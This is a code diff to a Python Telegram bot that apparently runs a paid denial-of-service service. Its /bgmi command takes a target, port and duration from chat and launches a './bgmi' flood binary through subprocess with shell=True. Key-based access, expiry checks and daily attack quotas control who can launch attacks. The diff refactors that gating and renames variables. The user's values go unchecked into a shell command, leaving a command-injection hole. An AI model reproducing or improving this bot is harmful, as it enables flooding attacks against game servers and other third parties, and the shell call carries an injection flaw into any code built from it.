@@ -28,7 +28,6 @@ MAX_ATTACKS_PER_DAY = 5
 COOLDOWN_TIME = 0  # Cooldown time between attacks in seconds
 
 # Function to read keys and their expiration dates from the file
-# Function to read keys from the file
 def read_keys():
     allowed_keys = {}
     if os.path.exists(KEY_FILE):
@@ -47,11 +46,11 @@ def read_keys():
 allowed_keys = read_keys()
 
 # Function to log command to the file
-def log_command(user_id, target, port, time):
+def log_command(user_id, target, port, duration):
     user_info = bot.get_chat(user_id)
     username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
     with open(LOG_FILE, "a") as file:
-        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
+        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")
 
 # Function to clear logs
 def clear_logs():
@@ -62,14 +61,14 @@ def clear_logs():
     return "No logs found to clear."
 
 # Function to record command logs
-def record_command_logs(user_id, command, target=None, port=None, time=None):
+def record_command_logs(user_id, command, target=None, port=None, duration=None):
     log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
     if target:
         log_entry += f" | Target: {target}"
     if port:
         log_entry += f" | Port: {port}"
-    if time:
-        log_entry += f" | Time: {time}"
+    if duration:
+        log_entry += f" | Time: {duration}"
 
     with open(LOG_FILE, "a") as file:
         file.write(log_entry + "\n")
@@ -219,11 +218,11 @@ def show_user_id(message):
     bot.reply_to(message, response)
 
 # Function to handle the reply when users run the /bgmi command
-def start_attack_reply(message, target, port, time):
+def start_attack_reply(message, target, port, duration):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, ATTACK STARTED.\n\nTarget: {target}\nPort: {port}\nTime: {time} Seconds\nMethod: BGMI"
+    response = f"{username}, ATTACK STARTED.\n\nTarget: {target}\nPort: {port}\nTime: {duration} Seconds\nMethod: BGMI"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -231,71 +230,44 @@ bgmi_cooldown = {}
 
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
-    if str(message.chat.id) not in VERIFIED_GROUP_IDS:
-        bot.reply_to(message, "This bot can only be used in a verified group.")
+    user_id = str(message.chat.id)
+    if user_id not in VERIFIED_GROUP_IDS and not has_valid_key(user_id):
+        bot.reply_to(message, "This bot can only be used in a verified group or with a valid key.")
         return
 
-    user_id = str(message.chat.id)
-    if is_user_admin(message.chat.id, message.from_user.id):
-        if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-            response = "You are on cooldown. Please wait before running the /bgmi command again."
-            bot.reply_to(message, response)
-            return
+    if is_key_expired(user_id):
+        bot.reply_to(message, "Your key has expired. Please enter a valid key to continue.")
+        return
 
-        bgmi_cooldown[user_id] = datetime.datetime.now()
-        
-        command = message.text.split()
-        if len(command) == 4:
-            target = command[1]
-            port = int(command[2])
-            time = int(command[3])
-            if time > 5000:
-                response = "Error: Time interval must be less than 5000."
-            else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
-                log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)
-                full_command = f"./bgmi {target} {port} {time} 2000"
-                subprocess.run(full_command, shell=True)
-                response = f"BGMI attack finished. Target: {target} Port: {port} Time: {time}"
+    if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
+        response = "You are on cooldown. Please wait before running the /bgmi command again."
+        bot.reply_to(message, response)
+        return
+
+    if not can_attack(user_id):
+        bot.reply_to(message, "You have reached the maximum number of attacks for today.")
+        return
+
+    bgmi_cooldown[user_id] = datetime.datetime.now()
+    track_attack(user_id)
+    
+    command = message.text.split()
+    if len(command) == 4:
+        target = command[1]
+        port = int(command[2])
+        duration = int(command[3])
+        if duration > 5000:
+            response = "Error: Time interval must be less than 5000."
         else:
-            response = "Usage: /bgmi <target> <port> <time>"
-    elif user_id in allowed_keys:
-        if is_key_expired(user_id):
-            bot.reply_to(message, "Your key has expired. Please enter a valid key to continue.")
-            return
-
-        if not has_valid_key(user_id):
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-                response = "You are on cooldown. Please wait before running the /bgmi command again."
-                bot.reply_to(message, response)
-                return
-
-            if not can_attack(user_id):
-                bot.reply_to(message, "You have reached the maximum number of attacks for today.")
-                return
-
-        bgmi_cooldown[user_id] = datetime.datetime.now()
-        track_attack(user_id)
-        
-        command = message.text.split()
-        if len(command) == 4:
-            target = command[1]
-            port = int(command[2])
-            time = int(command[3])
-            if time > 5000:
-                response = "Error: Time interval must be less than 5000."
-            else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
-                log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)
-                full_command = f"./bgmi {target} {port} {time} 2000"
-                subprocess.run(full_command, shell=True)
-                response = f"BGMI attack finished. Target: {target} Port: {port} Time: {time}"
-        else:
-            response = "Usage: /bgmi <target> <port> <time>"
+            record_command_logs(user_id, '/bgmi', target, port, duration)
+            log_command(user_id, target, port, duration)
+            start_attack_reply(message, target, port, duration)
+            full_command = f"./bgmi {target} {port} {duration} 2000"
+            subprocess.run(full_command, shell=True)
+            response = f"BGMI attack finished. Target: {target} Port: {port} Time: {duration}"
     else:
-        response = "You are not authorized to use this command."
+        response = "Usage: /bgmi <target> <port> <time>"
+    
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['mylogs'])
@@ -337,7 +309,7 @@ def broadcast_message(message):
         command = message.text.split(maxsplit=1)
         if len(command) > 1:
             message_to_broadcast = "Message to all users by admin:\n\n" + command[1]
-            with open(USER_FILE, "r") as file:
+            with open(KEY_FILE, "r") as file:
                 user_ids = file.read().splitlines()
                 for user_id in user_ids:
                     try:
